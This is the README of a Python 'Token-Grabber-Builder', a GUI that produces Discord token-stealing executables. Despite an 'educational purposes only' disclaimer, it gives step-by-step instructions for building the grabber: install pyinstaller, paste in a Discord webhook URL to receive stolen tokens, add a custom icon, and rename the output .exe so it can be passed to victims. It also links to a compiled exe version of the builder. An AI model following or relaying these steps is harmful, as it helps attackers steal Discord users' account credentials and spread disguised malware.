# Token-Grabber-Builder | Python
a GUI demonstrating how Discord token grabbers in .py can be created and converted to .exe format. 

## Updates
This token grabber builder requires Python to be installed in your pc. 
If you do not want to use Python, an exe version is available. It is a different builder which was written in C#.

[Download Exe Version](https://github.com/NightfallGT/Token-Grabber-Builder-Exe/releases/tag/v1.0)


## About
This tool should only be used for educational purposes only. Do not use this on others maliciously. This program demonstrates, in an easy GUI format, how token grabbers can be created and compiled to exe from a .py file. When this tool is used, it makes it easier to understand the process and methods of how the output .exe file searches for Discord tokens and the type of information it extracts from a user.

After the usage of this tool, you will learn the type of information a "Discord token grabber" extracts from a victim and some preventions to avoid this from happening. (such as why you should not run random .py/ .exe files)

## Preview
![Picture1](https://i.ibb.co/BL0tJxk/Screenshot-45.png)


## How to Use
### Get Python
If you dont have python installed, download python from https://www.python.org/
and make sure you click on the 'ADD TO PATH' option during
the installation.

![Picture2](https://datatofish.com/wp-content/uploads/2018/10/0001_add_Python_to_Path.png)

#### Run install.bat 
This installs pyinstaller automatically for you.
- If it doesn't work just type in cmd 
```
pip install pyinstaller
pip install pillow
```

#### Double click on main.py 
This runs the program. 

or type in cmd
```
python main.py
```

#### Get your webhook
 Go to Server settings > Integrations > Webhooks
Copy the webhook url and paste it in the program.
![Picture3](https://i.ibb.co/tpB5gW0/Screenshot-46.png)

#### Adding custom icons
You can also add icons to your exe file 
- Click on file > add icon 
- Then choose your icon file. It should be an .ico file
- After that, click build then you're done

Once you're done building the file, the output should be in the /dist folder. You can rename it to whatever you want.



